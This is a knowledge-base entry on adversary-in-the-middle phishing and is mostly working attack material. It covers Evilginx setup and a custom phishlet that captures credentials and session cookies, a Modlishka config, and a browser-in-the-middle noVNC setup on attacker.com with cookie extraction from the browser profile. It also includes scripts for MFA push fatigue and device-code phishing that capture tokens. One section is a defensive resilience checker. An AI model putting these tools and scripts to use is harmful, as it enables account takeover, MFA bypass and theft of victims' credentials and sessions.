# KB-34: Adversary-in-the-Middle (AitM) & Real-Time Phishing Attacks

## Overview

AitM phishing platforms act as transparent reverse proxies between victim and legitimate auth server. Unlike traditional phishing, AitM captures authenticated session cookies in real-time, bypassing ALL forms of MFA including hardware tokens (unless token binding is enforced).

---

## 1. EvilGinx2/3 — Real-Time Session Hijacking

### 1.1 Architecture

```
Victim Browser --> EvilGinx Proxy --> Real Auth Server
                      |
                  Captures:
                  - Credentials (username/password)
                  - Session cookies (post-MFA)
                  - Auth tokens
```

### 1.2 Setup and Configuration

```bash
# Installation
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make
./evilginx -p ./phishlets

# Configuration
config domain evil-domain.com
config ipv4 <SERVER_IP>

# Load phishlet
phishlets hostname o365 login.evil-domain.com
phishlets enable o365

# Create lure
lures create o365
lures get-url 0
```

### 1.3 Custom Phishlet Development

```yaml
name: 'custom-target'
author: 'pentester'
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'target.com'
    session: true
    is_landing: true

sub_filters:
  - triggers_on: 'login.target.com'
    orig_sub: 'login'
    domain: 'target.com'
    search: 'login.target.com'
    replace: 'login.{hostname}'
    mimes: ['text/html', 'application/javascript', 'application/json']

auth_tokens:
  - domain: '.target.com'
    keys: ['session_id', 'auth_token', '_csrf']
    type: 'cookie'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
```

---

## 2. Modlishka — Reverse Proxy Phishing

### 2.1 Configuration

```json
{
  "phishingDomain": "evil-domain.com",
  "listeningAddress": "0.0.0.0",
  "target": "target.com",
  "targetResources": "login.target.com,api.target.com",
  "trackingCookie": "id",
  "dynamicMode": true,
  "forceHTTPS": true,
  "credParams": "username,password,email,login,passwd"
}
```

---

## 3. Browser-in-the-Middle (BitM) Attacks

### 3.1 Architecture

BitM defeats ALL client-side protections including WebAuthn/FIDO2 because the victim interacts with the attacker's real browser via VNC stream.

```
Victim --> noVNC Stream --> Attacker's Browser --> Real Target
                                |
                           After auth:
                           Extract cookies from browser profile
```

### 3.2 Setup

```bash
# VNC + Browser setup
Xvnc :1 -geometry 1280x720 -depth 24
export DISPLAY=:1
chromium-browser --no-sandbox https://target.com/login &

# noVNC proxy
websockify --web=/usr/share/novnc/ 6080 localhost:5901

# Victim URL: https://attacker.com/vnc.html?host=attacker.com&port=6080

# Extract cookies after auth
sqlite3 ~/.config/chromium/Default/Cookies \
  "SELECT name, value FROM cookies WHERE host_key LIKE '%target.com%'"
```

### 3.3 What BitM Defeats

| Protection | Defeated by BitM? | Why |
|------------|-------------------|-----|
| FIDO2/WebAuthn | YES | Real browser on real origin |
| Passkeys (synced) | YES | Victim approves on their phone |
| Number matching MFA | YES | Victim sees real UI |
| Certificate auth (software) | YES | Cert on attacker's server |
| Certificate auth (smart card) | NO | Hardware on victim's device |
| Behavioral biometrics | SOMETIMES | May detect remote control |

---

## 4. AitM Resilience Testing

```python
class AitMResilienceTester:
    def __init__(self, target_url):
        self.target = target_url

    def check_token_binding(self):
        resp = requests.get(f"{self.target}/.well-known/openid-configuration")
        if resp.status_code == 200:
            config = resp.json()
            if 'dpop_signing_alg_values_supported' in config:
                print("[+] DPoP supported — tokens may be bound")
            else:
                print("[-] No DPoP — vulnerable to AitM session theft")
            methods = config.get('token_endpoint_auth_methods_supported', [])
            if 'tls_client_auth' in methods:
                print("[+] mTLS client auth supported")
            else:
                print("[-] No mTLS — no channel binding")

    def check_cookie_security(self):
        resp = requests.get(f"{self.target}/login", allow_redirects=False)
        for cookie in resp.cookies:
            flags = []
            if cookie.secure: flags.append('Secure')
            if not cookie.secure:
                print(f"  [!] {cookie.name}: Missing Secure flag")
            if cookie.domain.startswith('.'):
                print(f"  [!] {cookie.name}: Broad domain scope {cookie.domain}")

    def check_webauthn_support(self):
        resp = requests.get(f"{self.target}/login")
        indicators = ['navigator.credentials', 'PublicKeyCredential',
                       'webauthn', 'fido2', 'passkey']
        for ind in indicators:
            if ind.lower() in resp.text.lower():
                print(f"[+] WebAuthn indicator: {ind}")
                return True
        print("[-] No WebAuthn — vulnerable to AitM credential theft")
        return False
```

---

## 5. MFA Push Fatigue (Storm-2372 Campaign)

```python
class MFAPushFatigue:
    def __init__(self, target_url, username, password):
        self.target = target_url
        self.username = username
        self.password = password
        self.session = requests.Session()

    def trigger_push(self):
        return self.session.post(f"{self.target}/api/auth/login",
                                json={'username': self.username, 'password': self.password}).json()

    def check_approved(self, challenge_id):
        resp = self.session.get(f"{self.target}/api/auth/mfa/status",
                                params={'challenge_id': challenge_id})
        return resp.json().get('status') == 'approved'

    def run(self, max_attempts=50, delay_range=(2, 10)):
        import time, random
        for attempt in range(max_attempts):
            result = self.trigger_push()
            cid = result.get('challenge_id')
            if not cid: continue
            for _ in range(30):
                time.sleep(1)
                if self.check_approved(cid):
                    print(f"[+] PUSH APPROVED at attempt {attempt+1}!")
                    return True
            time.sleep(random.uniform(*delay_range))
        return False
```

---

## 6. Device Code Flow Phishing (Storm-2372)

```python
class DeviceCodePhishing:
    def __init__(self, tenant_id='common'):
        self.base = f"https://login.microsoftonline.com/{tenant_id}"

    def initiate(self, client_id, scope='https://graph.microsoft.com/.default offline_access'):
        resp = requests.post(f"{self.base}/oauth2/v2.0/devicecode",
                             data={'client_id': client_id, 'scope': scope})
        data = resp.json()
        print(f"[*] User code: {data.get('user_code')}")
        print(f"[*] URL: {data.get('verification_uri')}")
        return data

    def poll_token(self, device_code, client_id, interval=5, timeout=900):
        import time
        start = time.time()
        while time.time() - start < timeout:
            resp = requests.post(f"{self.base}/oauth2/v2.0/token",
                                 data={'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
                                       'client_id': client_id, 'device_code': device_code})
            data = resp.json()
            if 'access_token' in data:
                print(f"[+] TOKEN CAPTURED!")
                return data
            if data.get('error') not in ['authorization_pending']:
                return None
            time.sleep(interval)
```

## Number Matching Bypass Matrix

| Vector | Bypasses Number Matching? |
|--------|---------------------------|
| AitM (EvilGinx3) | YES — proxies the number |
| BitM (VNC) | YES — victim sees real UI |
| Push fatigue | NO — requires number |
| Social engineering call | SOMETIMES |
| SIM swap (SMS fallback) | YES if SMS fallback exists |
| Token theft (malware) | N/A — bypasses MFA entirely |

## References

- EvilGinx2/3 documentation
- Storm-2372 Microsoft Threat Intelligence report
- Modlishka project documentation
- BitM attack research papers
- Microsoft Authenticator number matching documentation
